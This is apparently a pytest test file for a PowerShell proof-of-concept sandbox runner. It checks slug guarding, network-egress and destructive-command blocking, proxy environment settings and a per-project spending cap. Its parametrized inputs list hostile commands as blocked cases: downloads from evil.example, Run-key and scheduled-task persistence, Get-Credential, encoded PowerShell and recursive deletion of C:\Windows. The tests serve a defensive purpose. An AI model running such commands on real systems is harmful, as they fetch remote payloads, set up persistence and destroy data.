# tests/runner/test_poc_sandbox.py
import importlib

import pytest


def _fresh(tmp_path, monkeypatch):
    import runner.tools.poc_sandbox as ps
    importlib.reload(ps)
    monkeypatch.setattr(ps, "POC_ROOT", tmp_path / "poc")
    monkeypatch.setattr(ps, "LEDGER_DIR", tmp_path / "ledger")
    return ps


class _FakeProc:
    def __init__(self, stdout="ok", stderr="", returncode=0):
        self.stdout = stdout
        self.stderr = stderr
        self.returncode = returncode


def _stub_subprocess(ps, monkeypatch):
    """Replace subprocess.run with a recorder so tests never spawn PowerShell.
    Returns the list of captured kwargs dicts (one per call)."""
    calls = []

    def fake_run(*args, **kwargs):
        calls.append(kwargs)
        return _FakeProc()

    monkeypatch.setattr(ps.subprocess, "run", fake_run)
    return calls


# ── slug guarding (unchanged behavior) ────────────────────────────────────────

def test_rejects_slug_escape(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    res = ps.poc_runner(slug="../evil", command="echo hi")
    assert res.get("blocked") is True


@pytest.mark.parametrize(
    "slug",
    ["../evil", "..\\evil", "/etc/passwd", "a/b", "a\\b", "Upper", "a", "", "x" * 60, "with space", ".hidden"],
)
def test_rejects_unsafe_slugs(tmp_path, monkeypatch, slug):
    ps = _fresh(tmp_path, monkeypatch)
    res = ps.poc_runner(slug=slug, command="echo hi")
    assert res.get("blocked") is True
    assert not ps.POC_ROOT.exists() or not any(ps.POC_ROOT.iterdir())


def test_runs_in_slug_dir(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    res = ps.poc_runner(slug="demo", command="echo prospector-ok")
    assert "prospector-ok" in (res.get("stdout") or "")
    assert (ps.POC_ROOT / "demo").exists()


def test_relative_writes_stay_in_slug_dir(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    ps.poc_runner(slug="demo", command="Set-Content -Path out.txt -Value hello")
    assert (ps.POC_ROOT / "demo" / "out.txt").exists()


def test_forbidden_command_blocked(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    res = ps.poc_runner(slug="demo", command="rm -rf /")
    assert res.get("blocked") is True
    assert "exit_code" not in res


def test_timeout_kills_command(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    res = ps.poc_runner(slug="demo", command="Start-Sleep -Seconds 10", timeout=2)
    assert res.get("error") == "timeout exceeded"
    assert res.get("exit_code") == -1


# ── network egress block ──────────────────────────────────────────────────────

@pytest.mark.parametrize("command", [
    "Invoke-WebRequest https://evil.example/x",
    "Invoke-RestMethod -Uri https://evil.example",
    "iwr https://evil.example -OutFile x",
    "irm https://evil.example",
    "curl https://evil.example",
    "wget https://evil.example",
    "Test-NetConnection google.com -Port 443",
    "tnc google.com -Port 80",
    "Start-BitsTransfer -Source https://evil.example/p.exe",
    "(New-Object System.Net.WebClient).DownloadString('https://evil.example')",
    "(New-Object Net.WebClient).DownloadFile('https://evil.example','x')",
    "python -c 'import socket; socket.socket()'",
    "python -c 'import urllib.request'",
    "python -c 'from urllib import request'",
    "python -c 'import requests; requests.get(\"https://x\")'",
    "python -c 'import httpx; httpx.get(\"https://x\")'",
])
def test_network_egress_blocked(tmp_path, monkeypatch, command):
    ps = _fresh(tmp_path, monkeypatch)
    calls = _stub_subprocess(ps, monkeypatch)
    res = ps.poc_runner(slug="demo", command=command)
    assert res.get("blocked") is True
    assert calls == []  # subprocess must never spawn


# ── broadened destructive / privilege filter ──────────────────────────────────

@pytest.mark.parametrize("command", [
    "Remove-Item -Recurse -Force .\\build",
    "Remove-Item -Force -Recurse C:\\Windows",   # flag order swapped
    "del /f /s /q C:\\stuff",
    "rd /s /q C:\\stuff",
    "rmdir /s /q C:\\stuff",
    "reg add HKLM\\Software\\Evil /v Run /d payload",
    "reg delete HKEY_LOCAL_MACHINE\\Software\\X",
    "Set-ItemProperty -Path HKLM:\\Software\\X -Name Run -Value p",
    "New-Item -Path HKLM:\\Software\\Evil",
    "schtasks /create /tn evil /tr payload.exe /sc onlogon",
    "Register-ScheduledTask -TaskName evil -Action $a",
    "taskkill /f /im python.exe",
    "Stop-Process -Force -Name runner",
    "Get-Credential",
    "$s | ConvertFrom-SecureString",
    "[System.Net.NetworkCredential]::new('u','p')",
    "powershell -EncodedCommand SQBFAFgA",
    "powershell -enc QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA",
])
def test_destructive_and_privilege_blocked(tmp_path, monkeypatch, command):
    ps = _fresh(tmp_path, monkeypatch)
    calls = _stub_subprocess(ps, monkeypatch)
    res = ps.poc_runner(slug="demo", command=command)
    assert res.get("blocked") is True, f"should block: {command}"
    assert calls == []


def test_benign_commands_not_over_blocked(tmp_path, monkeypatch):
    # Guard against false positives that would break legitimate PoC scaffolding.
    ps = _fresh(tmp_path, monkeypatch)
    calls = _stub_subprocess(ps, monkeypatch)
    for command in [
        "echo hello",
        "Set-Content -Path index.html -Value '<h1>hi</h1>' -Encoding utf8",
        "New-Item -ItemType Directory -Path src",
        "Get-ChildItem",
        "Remove-Item out.txt",  # delete w/o -Recurse -Force is allowed
    ]:
        res = ps.poc_runner(slug="demo", command=command)
        assert res.get("blocked") is not True, f"should allow: {command}"
    assert len(calls) == 5


# ── egress env vars on the subprocess ─────────────────────────────────────────

def test_egress_env_vars_set_on_subprocess(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    calls = _stub_subprocess(ps, monkeypatch)
    ps.poc_runner(slug="demo", command="echo hi")
    assert len(calls) == 1
    env = calls[0]["env"]
    assert env["HTTP_PROXY"] == ""
    assert env["HTTPS_PROXY"] == ""
    assert env["NO_PROXY"] == "*"
    assert env["no_proxy"] == "*"
    # ambient PATH still inherited so PowerShell can resolve itself
    assert "PATH" in env or "Path" in env


# ── per-PoC dollar meter ──────────────────────────────────────────────────────

def test_under_cap_runs_and_charges(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    monkeypatch.setattr(ps, "get_poc_cap", lambda *a, **k: 2.0)
    monkeypatch.setattr(ps, "get_poc_run_cost", lambda *a, **k: 0.05)
    calls = _stub_subprocess(ps, monkeypatch)
    res = ps.poc_runner(slug="demo", command="echo hi")
    assert res.get("blocked") is not True
    assert len(calls) == 1
    assert res["accumulated_usd"] == 0.05
    assert res["cap_usd"] == 2.0


def test_over_cap_refuses_without_spawning(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    monkeypatch.setattr(ps, "get_poc_cap", lambda *a, **k: 2.0)
    monkeypatch.setattr(ps, "get_poc_run_cost", lambda *a, **k: 0.05)
    # Seed the ledger at the cap.
    ps._charge_poc("demo", 2.0)
    calls = _stub_subprocess(ps, monkeypatch)
    res = ps.poc_runner(slug="demo", command="echo hi")
    assert res.get("blocked") is True
    assert "budget exceeded" in res["error"].lower()
    assert calls == []  # hard meter: no subprocess once envelope is spent


def test_ledger_persists_across_calls(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    monkeypatch.setattr(ps, "get_poc_cap", lambda *a, **k: 2.0)
    monkeypatch.setattr(ps, "get_poc_run_cost", lambda *a, **k: 0.10)
    _stub_subprocess(ps, monkeypatch)
    ps.poc_runner(slug="demo", command="echo one")
    ps.poc_runner(slug="demo", command="echo two")
    ledger = ps.read_poc_spend()
    entry = ledger["by_slug"]["demo"]
    assert entry["runs"] == 2
    assert entry["accumulated_usd"] == pytest.approx(0.20)
    assert entry["last_run"] is not None
    # spend is tracked per-slug, not globally
    assert ps.get_poc_spend("other-slug") == 0.0


def test_timeout_still_charges_envelope(tmp_path, monkeypatch):
    ps = _fresh(tmp_path, monkeypatch)
    monkeypatch.setattr(ps, "get_poc_cap", lambda *a, **k: 2.0)
    monkeypatch.setattr(ps, "get_poc_run_cost", lambda *a, **k: 0.05)

    def fake_run(*args, **kwargs):
        raise ps.subprocess.TimeoutExpired(cmd="powershell", timeout=2)

    monkeypatch.setattr(ps.subprocess, "run", fake_run)
    res = ps.poc_runner(slug="demo", command="Start-Sleep 99", timeout=2)
    assert res.get("error") == "timeout exceeded"
    assert ps.get_poc_spend("demo") == 0.05
